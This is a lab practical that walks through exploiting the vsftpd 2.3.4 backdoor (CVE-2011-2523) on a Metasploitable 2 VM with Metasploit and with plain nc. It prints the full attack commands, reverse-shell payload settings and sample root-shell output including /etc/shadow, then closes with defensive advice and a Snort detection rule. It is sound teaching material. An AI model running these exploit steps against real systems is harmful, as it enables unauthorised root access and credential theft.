# Practical 1: Hacking Linux OS using Metasploit Framework

## Objective

In this practical we use the **Metasploit Framework (MSF)** to exploit the well-known **vsftpd 2.3.4 backdoor** vulnerability on a **Metasploitable 2** target and obtain a remote shell as root.

By the end of this practical you will know how to:

- Start the Metasploit Framework and its PostgreSQL backend.
- Use Nmap to discover a vulnerable service on the target.
- Search for an exploit module, load it with `use`, and read its options.
- Choose and configure a compatible payload.
- Set `RHOSTS` / `LHOST` / `LPORT` and run the exploit.
- Interact with the resulting shell to confirm code execution.

---

## Background on the Vulnerability

In July 2011, the official **vsftpd 2.3.4** source tarball on the project's master mirror was replaced with a malicious copy containing a **backdoor**. Whenever a user logs in with a username that contains a smiley face — `:)` — the daemon silently opens a bind shell on **TCP port 6200**. Anyone who connects to that port gets a root shell with no authentication.

- **CVE:** CVE-2011-2523
- **CVSS v2:** 10.0 (critical)
- **Metasploit module:** `exploit/unix/ftp/vsftpd_234_backdoor`
- **Trigger:** Username ending in `:)` during FTP login
- **Result:** Root shell on `<target>:6200`

The Metasploitable 2 VM ships with this exact vulnerable binary, which makes it the canonical first-exploit lab target.

---

## Prerequisites

- **Attacker:** Parrot OS or Kali Linux with the Metasploit Framework installed (pre-installed on both).
- **Target:** Metasploitable 2 VM running in VirtualBox/VMware on the same Host-Only / NAT network as the attacker.
- Both machines reachable on the network (confirm with `ping`).

Verify on the attacker:

```bash
msfconsole --version
which nmap
```

If Metasploit is missing on Parrot/Kali:

```bash
sudo apt update
sudo apt install metasploit-framework -y
```

---

## Step 1: Start PostgreSQL and Metasploit

Metasploit uses **PostgreSQL** to cache workspace, hosts, services, and loot. Starting it before `msfconsole` enables the database commands (`hosts`, `services`, `workspace`).

```bash
# Start the database
sudo systemctl start postgresql
sudo systemctl status postgresql --no-pager | head -5

# Initialise the MSF database (first-run only)
sudo msfdb init

# Launch Metasploit (quiet banner)
msfconsole -q
```

**Sample output:**

```
       =[ metasploit v6.4.x-dev                          ]
+ -- --=[ 2400+ exploits - 1230+ auxiliary - 420+ post   ]
+ -- --=[ 980+ payloads - 45+ encoders - 11+ nops        ]
+ -- --=[ 9 evasion                                      ]

Metasploit tip: Use sessions -i <id> to interact with a session.

msf6 >
```

Confirm the database is connected:

```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

> **Note on the original practical:** The "default password `toor`" line refers to logging in as the `root` user on older Kali/Backtrack — it isn't a Postgres password. On modern Parrot/Kali, `sudo systemctl start postgresql` is the correct way to start the service.

---

## Step 2: Recon the Target with Nmap

Find the target's IP (e.g. from its login banner or DHCP lease) and scan it:

```bash
# Quick service/version scan of common ports
nmap -sV -p 21,22,23,80,139,445 192.168.56.102
```

**Sample output:**

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.56.102
Host is up (0.00042s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp  open  telnet      Linux telnetd
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian

Service detection performed. Nmap done: 1 IP address (1 host up) scanned in 7.1 seconds
```

The key line is `21/tcp open ftp vsftpd 2.3.4` — exactly the vulnerable version.

You can also run the scan **from inside `msfconsole`** so results land in the database automatically:

```
msf6 > db_nmap -sV -p 21 192.168.56.102
msf6 > services
```

---

## Step 3: Search for an Exploit

Inside `msfconsole`:

```
msf6 > search vsftpd 2.3.4
```

**Sample output:**

```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

Interact with a module by name or index. For example info 0, use 0
```

Get more details on the module:

```
msf6 > info exploit/unix/ftp/vsftpd_234_backdoor
```

This shows the description, author, references, supported platforms, and module options.

---

## Step 4: Load the Exploit Module

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

The prompt changes to confirm the module is loaded. Notice MSF auto-selected `cmd/unix/interact` as a default payload — appropriate, because the exploit gives a shell directly via the backdoor port.

You can also `use 0` (using the index from the search result) for brevity.

---

## Step 5: Show the Exploit's Options

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

**Sample output:**

```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   CHOST                    no        The local client address
   CPORT                    no        The local client port
   Proxies                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                   yes       The target host(s)
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


View the full module info with the info, or info -d command.
```

Only `RHOSTS` is missing.

---

## Step 6: Set `RHOSTS`

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
RHOSTS => 192.168.56.102
```

Verify:

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

`RHOSTS` should now read `192.168.56.102`. `RPORT` already defaults to 21, which is correct.

> **`RHOST` vs `RHOSTS`:** Older modules used `RHOST` (singular). Modern MSF (v5+) uses `RHOSTS` (plural) for both single hosts and ranges (`192.168.56.0/24`, `192.168.56.10-20`). MSF accepts either, but `RHOSTS` is the canonical form.

---

## Step 7: List Compatible Payloads

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads
```

**Sample output:**

```
Compatible Payloads
===================

   #  Name                  Disclosure Date  Rank    Check  Description
   -  ----                  ---------------  ----    -----  -----------
   0  payload/cmd/unix/interact                     normal  No     Unix Command, Interact with Established Connection
```

For this particular exploit there is only **one compatible payload** — `cmd/unix/interact`. That's because the backdoor itself opens a fully interactive shell on port 6200; Metasploit just needs to talk to it, not deliver shellcode. This is unusual — most exploits offer dozens of payload choices (`linux/x86/meterpreter/reverse_tcp`, `linux/x64/shell_reverse_tcp`, …).

---

## Step 8: Set the Payload (Optional Here)

Because the default is already correct, this step is informational:

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
payload => cmd/unix/interact
```

For exploits that take a reverse-shell payload, the typical syntax would be:

```
set payload linux/x86/meterpreter/reverse_tcp
```

---

## Step 9: Show Payload Options

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

For `cmd/unix/interact` there are **no payload options** — nothing to configure. That's because the payload connects to the backdoor port (6200), which is decided by the exploit, not by you.

For reverse-shell payloads you would see `LHOST` and `LPORT` here.

---

## Step 10: `LHOST` / `LPORT` (For Reverse Payloads — Not Needed Here)

This exploit uses a **bind shell on the target** (port 6200), so there is no `LHOST`/`LPORT` to set. For most other Linux exploits you would set:

```
set LHOST 192.168.56.101       # the attacker's IP (NOT 127.0.0.1)
set LPORT 4444                 # any free port on the attacker
```

> **Common mistake:** Setting `LHOST` to `127.0.0.1` — the target then tries to connect back to itself. `LHOST` must be the attacker's address as seen from the target.

You can find your IP with:

```bash
ip -4 addr show | grep inet
```

---

## Step 11: Run the Exploit

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

(or `run` — they're aliases).

**Sample output:**

```
[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.102:21 - USER: 331 Please specify the password.
[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.101:42316 -> 192.168.56.102:6200) at 2026-05-19 13:42:18 +0530
```

**What just happened, line by line:**

1. MSF connected to FTP on port 21.
2. It sent `USER hacker:)` — the smiley-face trigger.
3. The backdoor opened `6200/tcp` on the target.
4. MSF connected to `6200/tcp` and got a root shell.
5. A new **command shell session** (session 1) was created.

The cursor is now sitting at a shell prompt on the target — no prompt character, just a blinking cursor.

---

## Step 12: Run Linux Commands on the Target

Type any Linux command and press Enter to confirm code execution as root:

```
id
uid=0(root) gid=0(root)

whoami
root

hostname
metasploitable

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

cat /etc/passwd | head -5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync

cat /etc/shadow | head -3
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::

ls /root
reset_logs.sh
```

You now have full root control over the target — all files readable/writable, all processes, all network interfaces.

### Upgrade to a Better Shell (Optional)

The raw shell from `cmd/unix/interact` is functional but limited (no tab-completion, no Ctrl+C, no job control). Upgrade it by **backgrounding the session** and dropping a Python TTY:

```
^Z                            # Ctrl-Z to background, or:
background
[*] Backgrounding session 1...

msf6 > sessions -l
msf6 > sessions -u 1          # try to upgrade to Meterpreter (works on most Linux hosts)
```

Or upgrade manually inside the shell:

```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### Cleanly Exit

```
exit                          # leaves the target shell
msf6 > sessions -K            # kill all sessions
msf6 > exit                   # leave msfconsole
```

---

## Full Walk-Through, Single Block

For reference, the entire attack in commands:

```
sudo systemctl start postgresql
msfconsole -q

msf6 > db_nmap -sV -p 21 192.168.56.102

msf6 > search vsftpd 2.3.4
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.56.102
msf6 > show options
msf6 > exploit

# Shell opens — you are root
id
hostname
cat /etc/shadow
```

---

## Manual Reproduction (Without Metasploit)

To demystify the exploit, the same backdoor can be triggered with plain `nc`:

```bash
# Terminal 1 — knock on the backdoor
nc 192.168.56.102 21
220 (vsFTPd 2.3.4)
USER hacker:)
331 Please specify the password.
PASS x
# (the FTP login appears to hang — that's the backdoor activating)

# Terminal 2 — connect to port 6200
nc 192.168.56.102 6200
id
uid=0(root) gid=0(root)
```

Metasploit automates exactly this two-connection dance for you.

---

## Troubleshooting

| Issue                                              | Fix                                                                |
| -------------------------------------------------- | ------------------------------------------------------------------ |
| `Postgres connection refused`                      | `sudo systemctl start postgresql; sudo msfdb init`                  |
| `Exploit completed, but no session was created.`   | Backdoor already triggered/closed — restart the Metasploitable VM   |
| Cannot ping target                                 | Check VM network mode (Host-Only/NAT), both VMs on same subnet     |
| Wrong vsftpd version                               | Confirm with `nmap -sV -p21` — only `2.3.4` is vulnerable          |
| Slow / hanging exploit                             | Some Metasploitable images have a stale backdoor lock; reboot the VM |
| `LHOST` set to 127.0.0.1 in other exploits         | Set to your actual interface IP                                    |

---

## Comparison: Why This Exploit is "Different"

Most real-world exploits look like this:

```
use exploit/multi/handler            # generic listener for callback
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <attacker-IP>
set LPORT 4444
run
```

…and a **separate** exploit module triggers the bug, which makes the target connect *back* to the attacker (`reverse_tcp`) or wait for the attacker (`bind_tcp`).

In contrast, `vsftpd_234_backdoor` is unusual because:

- The backdoor binary itself does the "spawn shell" job — no shellcode is delivered.
- The shell is **bound** on the target (port 6200), not reverse.
- Only `cmd/unix/interact` is compatible — Metasploit just talks to the existing shell.

This makes it the **simplest possible** Metasploit exploit to learn with — no `LHOST`, no `LPORT`, no encoding, no AV evasion.

---

## Observations / Conclusion

Using Metasploit we:

1. Started PostgreSQL and `msfconsole`, confirming `db_status` was *connected*.
2. Recon'd the target with Nmap and confirmed the vulnerable banner `vsftpd 2.3.4`.
3. Found the exploit module with `search`, loaded it with `use`, and read options with `show options`.
4. Set only `RHOSTS` (the backdoor is bound, so no `LHOST`/`LPORT`).
5. Ran the exploit, opened **session 1**, and ran shell commands as **uid=0(root)**.

Total time from `msfconsole` to root shell: **< 60 seconds**.

This is why CVE-2011-2523 is one of the most-quoted CVEs in introductory red-team courses — it demonstrates the full Metasploit workflow end-to-end on a 100% reliable exploit.

---

## Defensive Recommendations

- **Never use vsftpd 2.3.4** — install 2.3.5 or newer from the OS package manager.
- **Verify integrity of source tarballs** with checksums and PGP signatures before building software.
- **Use SFTP (SSH) instead of plaintext FTP** — FTP transmits credentials in cleartext anyway.
- **Restrict file-transfer services to trusted networks / VPN**.
- **Run vulnerability scanners regularly** (Nessus / OpenVAS / nmap-vulners) to catch outdated services.
- **Monitor for unexpected listening ports** — a sudden new listener on 6200/tcp is the textbook IOC for this backdoor.
- **Network IDS / EDR** — Snort and Suricata both ship signatures for the `USER ...:)` pattern.

### Snort signature example

```
alert tcp any any -> $HOME_NET 21 (msg:"vsftpd 2.3.4 backdoor trigger"; \
  content:"USER "; depth:5; content:":)"; distance:0; sid:1000001; rev:1;)
```

---

## Disclaimer

This practical is for **educational purposes** only. Run it **only on Metasploitable 2 in your own isolated lab** (or another system you have explicit written authorisation to test). Exploiting systems you do not own is illegal under laws such as the Information Technology Act in India and the Computer Fraud and Abuse Act in the US.
